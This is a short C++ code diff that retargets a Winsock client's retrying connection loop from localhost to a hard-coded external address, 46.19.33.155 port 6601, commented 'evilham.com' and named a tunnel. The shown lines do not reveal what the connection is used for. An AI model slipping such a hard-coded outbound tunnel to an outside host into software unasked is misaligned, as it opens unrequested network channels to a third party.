@@ -49,16 +49,15 @@ int main(int argc, char **argv)
         std::cout << "Could not create socket" << std::endl;
         return false;
     }
-    struct sockaddr_in service;
-    service.sin_family = AF_INET;
-    inet_pton(AF_INET, "127.0.0.1", &service.sin_addr);
-    //service.sin6_addr = in6addr_any;
-    service.sin_port = htons(55500);
-    //service.sin_scope_id = 0;
+    // Set up target address
+    struct sockaddr_in tunnel_addr;
+    tunnel_addr.sin_family = AF_INET;
+    inet_pton(AF_INET, "46.19.33.155", &tunnel_addr.sin_addr.s_addr); // evilham.com
+    tunnel_addr.sin_port = htons(6601);
 
     while (true)
     {
-        if (connect(sock, (SOCKADDR*)(&service), sizeof(service)) != 0)
+        if (connect(sock, (SOCKADDR*)(&tunnel_addr), sizeof(tunnel_addr)) != 0)
         {
             std::cout << "Failed to establish connection with server" <<
                 WSAGetLastError() << std::endl;
